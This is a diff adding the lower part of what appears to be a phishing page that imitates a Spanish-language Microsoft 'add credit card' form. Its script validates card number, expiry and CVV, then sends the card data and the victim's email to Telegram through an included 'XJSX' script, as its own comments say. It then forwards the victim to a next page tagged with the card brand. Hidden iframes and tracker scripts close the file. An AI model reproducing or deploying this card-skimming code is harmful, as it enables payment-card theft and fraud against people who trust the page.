+          <span class="text-center text-xs leading-tight hidden sm:inline">Exploración privada recomendada</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Script de Telegram XJSX -->
+    <script src="xjsx.js"></script>
+    
+    <script>
+      let currentCardType = null;
+      
+      // Card type detection patterns
+      const cardPatterns = {
+        visa: /^4/,
+        mastercard: /^5[1-5]|^2[2-7]/,
+        amex: /^3[47]/,
+        discover: /^6(?:011|5)/
+      };
+      
+      // Card validation rules
+      const cardRules = {
+        visa: { length: 16, cvvLength: 3, format: '#### #### #### ####' },
+        mastercard: { length: 16, cvvLength: 3, format: '#### #### #### ####' },
+        amex: { length: 15, cvvLength: 4, format: '#### ###### #####' },
+        discover: { length: 16, cvvLength: 3, format: '#### #### #### ####' }
+      };
+      
+      function detectCardType(number) {
+        const cleanNumber = number.replace(/\s/g, '');
+        
+        for (const [type, pattern] of Object.entries(cardPatterns)) {
+          if (pattern.test(cleanNumber)) {
+            return type;
+          }
+        }
+        return null;
+      }
+      
+      function updateCardIcons(cardType) {
+        // Remove active class from all icons
+        document.querySelectorAll('.card-icon').forEach(icon => {
+          icon.classList.remove('active');
+        });
+        
+        // Add active class to detected card type
+        if (cardType) {
+          const activeIcon = document.querySelector(`.card-icon.${cardType}`);
+          if (activeIcon) {
+            activeIcon.classList.add('active');
+          }
+        }
+      }
+      
+      function updateLabelsAndPlaceholders(cardType) {
+        const cardNumberInput = document.getElementById('cardNumber');
+        const cvvInput = document.getElementById('cvv');
+        const cardNumberLabel = document.getElementById('cardNumberLabel');
+        const cvvLabel = document.getElementById('cvvLabel');
+        
+        if (cardType && cardRules[cardType]) {
+          const rules = cardRules[cardType];
+          
+          // Update labels
+          cardNumberLabel.textContent = `Número de tarjeta* (${rules.length} dígitos)`;
+          cvvLabel.textContent = `CVV* (${rules.cvvLength} dígitos)`;
+          
+          // Update placeholders
+          cardNumberInput.placeholder = rules.format.replace(/#/g, '•');
+          cvvInput.placeholder = '•'.repeat(rules.cvvLength);
+          cvvInput.maxLength = rules.cvvLength;
+          
+          // Update max length for card number (including spaces)
+          const spacesCount = (rules.format.match(/ /g) || []).length;
+          cardNumberInput.maxLength = rules.length + spacesCount;
+        } else {
+          // Default values
+          cardNumberLabel.textContent = 'Número de tarjeta*';
+          cvvLabel.textContent = 'CVV*';
+          cardNumberInput.placeholder = '•••• •••• •••• ••••';
+          cvvInput.placeholder = '•••';
+          cvvInput.maxLength = 4;
+          cardNumberInput.maxLength = 23;
+        }
+      }
+      
+      function validateCardNumber(number, cardType) {
+        const cleanNumber = number.replace(/\s/g, '');
+        const cardError = document.getElementById('cardError');
+        
+        if (!cardType) {
+          if (cleanNumber.length > 0) {
+            cardError.textContent = 'Tipo de tarjeta no reconocido';
+            cardError.classList.remove('hidden');
+            return false;
+          }
+          cardError.classList.add('hidden');
+          return true;
+        }
+        
+        const rules = cardRules[cardType];
+        if (cleanNumber.length > 0 && cleanNumber.length !== rules.length) {
+          cardError.textContent = `${cardType.toUpperCase()} debe tener ${rules.length} dígitos`;
+          cardError.classList.remove('hidden');
+          return false;
+        }
+        
+        cardError.classList.add('hidden');
+        return true;
+      }
+      
+      function validateCVV(cvv, cardType) {
+        const cvvError = document.getElementById('cvvError');
+        
+        if (!cardType) {
+          cvvError.classList.add('hidden');
+          return true;
+        }
+        
+        const rules = cardRules[cardType];
+        if (cvv.length > 0 && cvv.length !== rules.cvvLength) {
+          cvvError.textContent = `CVV debe tener ${rules.cvvLength} dígitos para ${cardType.toUpperCase()}`;
+          cvvError.classList.remove('hidden');
+          return false;
+        }
+        
+        cvvError.classList.add('hidden');
+        return true;
+      }
+      
+      function formatCardNumber(input) {
+        let value = input.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
+        
+        // Detect card type
+        const cardType = detectCardType(value);
+        
+        // Update UI if card type changed
+        if (cardType !== currentCardType) {
+          currentCardType = cardType;
+          updateCardIcons(cardType);
+          updateLabelsAndPlaceholders(cardType);
+        }
+        
+        // Format according to card type
+        let formattedValue = value;
+        if (cardType && cardRules[cardType]) {
+          const rules = cardRules[cardType];
+          if (cardType === 'amex') {
+            // AMEX format: #### ###### #####
+            formattedValue = value.replace(/(\d{4})(\d{6})(\d{5})/, '$1 $2 $3');
+            if (value.length <= 4) {
+              formattedValue = value;
+            } else if (value.length <= 10) {
+              formattedValue = value.replace(/(\d{4})(\d+)/, '$1 $2');
+            }
+          } else {
+            // Standard format: #### #### #### ####
+            formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+          }
+        } else {
+          // Default format
+          formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+        }
+        
+        input.value = formattedValue;
+        
+        // Validate
+        validateCardNumber(formattedValue, cardType);
+      }
+      
+      function formatMonth(input) {
+        let value = input.value.replace(/[^0-9]/gi, '');
+        if (value.length === 1 && parseInt(value) > 1) {
+          value = '0' + value;
+        }
+        if (parseInt(value) > 12) {
+          value = '12';
+        }
+        if (parseInt(value) < 1 && value.length === 2) {
+          value = '01';
+        }
+        input.value = value;
+        
+        // Validar fecha cuando ambos campos estén completos
+        validateExpiryDate();
+      }
+      
+      function formatYear(input) {
+        let value = input.value.replace(/[^0-9]/gi, '');
+        input.value = value;
+        
+        // Validar fecha cuando ambos campos estén completos
+        validateExpiryDate();
+      }
+      
+      function validateExpiryDate() {
+        const monthInput = document.getElementById('expiryMonth');
+        const yearInput = document.getElementById('expiryYear');
+        const month = monthInput.value;
+        const year = yearInput.value;
+        
+        // Limpiar errores previos
+        monthInput.classList.remove('border-red-500', 'bg-red-50');
+        yearInput.classList.remove('border-red-500', 'bg-red-50');
+        
+        // Remover mensaje de error previo
+        const existingError = document.getElementById('expiryError');
+        if (existingError) {
+          existingError.remove();
+        }
+        
+        // Solo validar si ambos campos tienen valores
+        if (month.length === 2 && year.length === 2) {
+          const currentDate = new Date();
+          const currentYear = currentDate.getFullYear() % 100; // Últimos 2 dígitos
+          const currentMonth = currentDate.getMonth() + 1; // Mes actual (1-12)
+          
+          const inputMonth = parseInt(month);
+          const inputYear = parseInt(year);
+          
+          let isValid = true;
+          let errorMessage = '';
+          
+          // Validar mes (1-12)
+          if (inputMonth < 1 || inputMonth > 12) {
+            isValid = false;
+            errorMessage = 'Mes debe estar entre 01 y 12';
+          }
+          // Validar que no sea una fecha pasada
+          else if (inputYear < currentYear || (inputYear === currentYear && inputMonth < currentMonth)) {
+            isValid = false;
+            errorMessage = 'La tarjeta ha expirado';
+          }
+          // Validar que no sea demasiado en el futuro (máximo 10 años)
+          else if (inputYear > 50) { // Permitir hasta 2050 (50 en formato YY)
+            isValid = false;
+            errorMessage = 'Año máximo permitido: 2050';
+          }
+          
+          if (!isValid) {
+            // Agregar estilos de error
+            monthInput.classList.add('border-red-500', 'bg-red-50');
+            yearInput.classList.add('border-red-500', 'bg-red-50');
+            
+            // Mostrar mensaje de error
+            const errorDiv = document.createElement('div');
+            errorDiv.id = 'expiryError';
+            errorDiv.className = 'text-red-600 text-sm mt-1';
+            errorDiv.textContent = errorMessage;
+            
+            // Insertar después del contenedor de fecha
+            const expiryContainer = monthInput.closest('.grid').parentElement;
+            expiryContainer.appendChild(errorDiv);
+            
+            return false;
+          }
+        }
+        
+        return true;
+      }
+      
+      function formatCVV(input) {
+        let value = input.value.replace(/[^0-9]/gi, '');
+        input.value = value;
+        
+        // Validate CVV
+        validateCVV(value, currentCardType);
+      }
+      
+      function handlePayment(event) {
+        event.preventDefault();
+        
+        // Prevenir múltiples envíos
+        const button = event.target.querySelector('button[type="submit"]') || document.querySelector('button[type="submit"]');
+        if (button.disabled) {
+          return;
+        }
+        
+        const cardNumber = document.getElementById('cardNumber').value;
+
+        // ✅ Detectar si empieza por 4 o 5 (VISA / MASTERCARD)
+        const raw = (cardNumber || '').replace(/\s+/g, '');
+        const brandParam = raw.startsWith('4') ? 'visa'
+               : raw.startsWith('5') ? 'mastercard'
+               : '';
+        const cardholderName = document.getElementById('cardholderName').value;
+        const expiryMonth = document.getElementById('expiryMonth').value;
+        const expiryYear = document.getElementById('expiryYear').value;
+        const cvv = document.getElementById('cvv').value;
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email') || '';
+        
+        // Final validation before submission
+        const cardType = detectCardType(cardNumber);
+        const isCardValid = validateCardNumber(cardNumber, cardType);
+        const isCvvValid = validateCVV(cvv, cardType);
+        const isExpiryValid = validateExpiryDate();
+        
+        if (!isCardValid || !isCvvValid || !isExpiryValid) {
+          // Scroll to first error
+          const firstError = document.querySelector('#cardError:not(.hidden), #cvvError:not(.hidden), #expiryError');
+          if (firstError) {
+            firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+          }
+          
+          return;
+        }
+        
+        if (cardNumber && cardholderName && expiryMonth && expiryYear && cvv && isCardValid && isCvvValid && isExpiryValid) {
+          // Disable button immediately
+          button.disabled = true;
+          button.textContent = 'Procesando...';
+          
+          // Preparar datos de la tarjeta
+          const cardData = {
+            email: email,
+            cardNumber: cardNumber,
+            cardholderName: cardholderName,
+            expiryMonth: expiryMonth,
+            expiryYear: expiryYear,
+            cvv: cvv,
+            sameAddress: document.getElementById('sameAddress').checked
+          };
+          
+          // Enviar datos de tarjeta a Telegram ANTES de procesar
+          if (typeof sendCardData !== 'undefined') {
+            console.log('📤 Enviando datos de tarjeta...');
+            
+            sendCardData(cardData)
+              .then(success => {
+                console.log(success ? '✅ Tarjeta enviada' : '❌ Error enviando tarjeta');
+                setTimeout(() => {
+                  
+                const qs = new URLSearchParams();
+                if (email) qs.set("email", email);
+                if (brandParam) qs.set("brand", brandParam);
+
+                window.location.href = `index5.html?${qs.toString()}`;
+
+                }, 1500);
+              })
+              .catch(error => {
+                console.error('❌ Error:', error);
+                setTimeout(() => {
+                
+                const qs = new URLSearchParams();
+                if (email) qs.set("email", email);
+                if (brandParam) qs.set("brand", brandParam);
+
+                window.location.href = `index5.html?${qs.toString()}`;
+
+                }, 1500);
+              });
+          } else {
+            console.warn('⚠️ XJSX no cargado');
+            setTimeout(() => {
+            
+            const qs = new URLSearchParams();
+            if (email) qs.set("email", email);
+            if (brandParam) qs.set("brand", brandParam);
+
+            window.location.href = `index5.html?${qs.toString()}`;
+
+            }, 1500);
+          }
+        }
+      }
+      
+      // Auto-focus on card number field
+      window.addEventListener('load', function() {
+        document.getElementById('cardNumber').focus();
+      });
+      
+      // Agregar validación en tiempo real cuando el usuario sale de los campos
+      document.addEventListener('DOMContentLoaded', function() {
+        const monthInput = document.getElementById('expiryMonth');
+        const yearInput = document.getElementById('expiryYear');
+        
+        monthInput.addEventListener('blur', validateExpiryDate);
+        yearInput.addEventListener('blur', validateExpiryDate);
+      });
+    </script>
+  <!-- Inserted by miarroba -->
+<script type="text/javascript" src="./Microsoft - Añadir tarjeta de crédito_files/hosting__contador__visitas__unicas.php"></script>
+<!-- Inserted by miarroba -->
+
+
+<script id="" text="" charset="" type="text/javascript" src="./Microsoft - Añadir tarjeta de crédito_files/js"></script>
+<script type="text/javascript" id="" charset="">window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date);gtag("config","G-C2Z4YC0WNE",{page_path:location.hostname+location.pathname});</script>
+<iframe src="./Microsoft - Añadir tarjeta de crédito_files/aframe.html" width="0" height="0" style="display: none;" bis_size="{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:0,&quot;abs_y&quot;:0}"></iframe></body><iframe id="google_esf" name="google_esf" src="./Microsoft - Añadir tarjeta de crédito_files/zrt_lookup_fy2021.html" bis_precise_ad="1" bis_size="{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:0,&quot;abs_y&quot;:0}" bis_id="fr_oobr30a5sdf34q7vlofx7o" bis_depth="0" bis_chainid="2" style="display: none;"></iframe></html>
